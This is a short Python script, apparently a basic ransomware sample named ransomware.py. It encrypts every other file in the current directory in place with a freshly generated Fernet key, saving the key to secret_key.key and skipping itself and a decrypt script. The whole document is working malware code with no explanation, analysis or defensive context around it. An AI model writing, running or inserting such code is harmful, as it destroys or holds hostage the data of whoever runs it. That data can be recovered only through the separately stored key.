import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "ransomware.py" or file == "secret_key.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

key = Fernet.generate_key()

with open("secret_key.key", "wb") as the_key:
    the_key.write(key)

for file in files:
    with open(file, "rb") as target:
        contents = target.read()
        encrypted_contents = Fernet(key).encrypt(contents)

    with open(file, "wb") as target:
        target.write(encrypted_contents)